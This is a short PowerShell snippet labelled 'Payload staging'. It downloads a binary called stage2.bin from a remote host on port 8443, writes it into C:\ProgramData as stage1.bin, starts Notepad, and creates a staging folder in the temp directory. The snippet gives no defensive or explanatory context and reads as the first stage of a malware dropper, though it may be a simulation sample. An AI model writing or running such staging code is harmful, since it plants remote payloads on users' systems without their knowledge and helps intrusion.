
<# Payload staging #> try { Invoke-WebRequest -Uri "https://contoso.com:8443/cdn/stage2.bin" -OutFile 'C:\ProgramData\stage1.bin' -UseBasicParsing; Start-Process -FilePath 'notepad.exe'; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force } catch { Write-Warning "Stage transfer failed" }
